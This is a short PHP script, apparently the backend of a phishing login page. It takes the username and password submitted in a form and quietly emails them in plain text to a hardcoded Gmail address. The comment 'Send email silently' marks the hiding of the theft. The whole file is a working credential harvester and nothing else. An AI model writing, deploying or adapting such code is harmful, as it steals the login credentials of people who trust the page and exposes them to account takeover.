<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect data from the form
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Email settings
    $to = "yadavdheeraj1712@gmail.com"; // Replace with your email address
    $subject = "New Login Attempt";
    $body = "You have received a new login attempt:\n\n".
            "Username: $username\n".
            "Password: $password";

    // Send email silently
    mail($to, $subject, $body);
}
?>
